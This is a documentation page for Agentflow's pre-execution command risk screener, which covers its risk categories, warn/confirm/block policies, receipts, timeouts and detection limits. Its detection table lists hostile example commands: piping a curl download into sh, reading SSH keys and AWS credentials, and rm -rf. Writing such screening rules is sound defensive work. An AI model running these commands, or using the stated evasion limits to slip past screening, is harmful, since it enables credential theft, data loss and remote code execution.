# Command Risk Screening

`agentflow run` is the single point where a planned command crosses into
execution. Before it runs the command, Agentflow classifies it with a
deterministic, no-network, no-LLM analyzer and records the result on the
command receipt. A policy can block high-risk commands before they execute.

> **This is deterministic risk *screening*, not a security sandbox.** It does
> not contain execution, intercept syscalls, or fully model shell semantics. It
> is a conservative pattern matcher over the argv the caller passed (plus any
> `sh -c` payload string). Treat it as a guardrail that catches obvious mistakes,
> not as a containment boundary.

## What gets flagged

The analyzer inspects the program and flags (e.g. `rm -rf`), and — when the
command is a shell wrapper such as `sh -c "..."`, `/bin/bash -c "..."`,
`/usr/bin/env bash -c "..."`, or `sudo sh -c "..."` — it also scans inside the
payload string, where pipes and redirections actually live.

| Category | Example | Level |
|---|---|---|
| `destructive_delete` | `rm -rf build`, `find . -delete` | high |
| `permission_change` | `chmod 777 x`, `chmod -R a+rwx`, `chown -R` | high |
| `credential_read` | `cat ~/.ssh/id_rsa`, reads of `.aws/credentials`, `.env`, `*.pem` | high |
| `privilege_escalation` | `sudo ...`, `su`, `doas` | high |
| `pipe_to_shell` | `curl https://x/i.sh \| sh` (inside `sh -c`) | high |
| `blocked_path` | any token matching the plan's `blocked_files` | high |
| `write_outside_scope` | redirect/write target outside the step's effective scope | high (explicit redirect) / medium (ambiguous `cp`/`mv`/`tee` target) |
| (nothing matched) | `python3 -m unittest discover -s tests` | low |

The overall level is the highest matched finding. **Only `high` is ever
blockable** — `medium` and `low` are recorded but never block under any policy.

"Effective scope" for `write_outside_scope` and `blocked_path` is the same scope
used by file receipts: the step's `files` intersected with top-level
`allowed_files`, minus `blocked_files`.

## Policy

`command_policy.risk_policy` in `.agent/execution.contract.json` selects the
behavior for high-risk commands:

| Value | Behavior on a high-risk command |
|---|---|
| `warn` | record the risk, always execute |
| `require-confirmation` | block unless the operator explicitly confirms |
| `block` | always block |

New `init-execution` contracts default to **`require-confirmation`** (fail
closed). Contracts with **no** `risk_policy` key — including pre-existing
projects — are treated as **`warn`**, so existing flows are unchanged. A present
but invalid value is an error in both `doctor` and pre-execution enforcement, so
a typo cannot silently degrade to `warn`.

## Confirming a high-risk command

Under `require-confirmation`, override the block with an explicit, auditable
signal:

```bash
agentflow run --step P1 --confirm-risk -- <command>
# or, for non-interactive runners:
AGENTFLOW_CONFIRM_RISK=1 agentflow run --step P1 -- <command>
```

When a confirmation lets a high-risk command through, the receipt records
`risk_policy`, `confirmed: true`, and `confirmation_source` (`cli` or `env`).
`block` is absolute and ignores confirmation.

## Receipts and observability

- An executed command records `risk: {level, findings}` and `decision: "allowed"`.
- A blocked command writes a receipt with `exit_code: null`,
  `decision: "blocked"`, and **no `gate`** — so a blocked command can never be
  mistaken for validation proof. `agentflow run` exits non-zero (`2`) and prints
  the reason to stderr.
- `agentflow events` projects `decision`, `risk_level`, and finding count for
  command events.
- `build-proof`'s execution summary reports command decision counts, risk-level
  counts, confirmed high-risk count, and finding categories.

Externally recorded commands (`agentflow record-command`) are classified too,
but the risk is **advisory only** — it never blocks, because the command already
ran.

## Timeout outcomes

Risk policy and timeout policy answer different questions. Risk screening runs
before subprocess launch and records whether the command was allowed to start.
Timeout enforcement applies after an allowed command starts.

- `decision: "allowed"` means risk policy allowed the command and the process
  completed before timeout; `exit_code` records success or failure.
- `decision: "blocked"` means risk policy prevented execution before subprocess
  launch.
- `decision: "timeout"` means risk policy allowed execution, but the configured
  timeout expired before the process completed.

New execution contracts default to `command_policy.command_timeout_seconds:
600`. Structured command gates may set `timeout_seconds` to a positive integer
when a specific validation command needs a longer or shorter bound. Timed-out
commands record `exit_code: null`, `timed_out: true`, and `timeout_seconds`;
they never satisfy validation gates.

## Detection limits

- Only argv tokens and `sh -c` payload strings are scanned. Commands that build
  paths dynamically, encode them, or use shell features the analyzer does not
  model can evade screening.
- Absolute paths are normalized against the repo root when known; paths outside
  the repo are compared as-is.
- `write_outside_scope` is best-effort: explicit redirections are treated as
  high, while ambiguous write-looking operands (`cp`/`mv`/`tee` destinations)
  are medium.
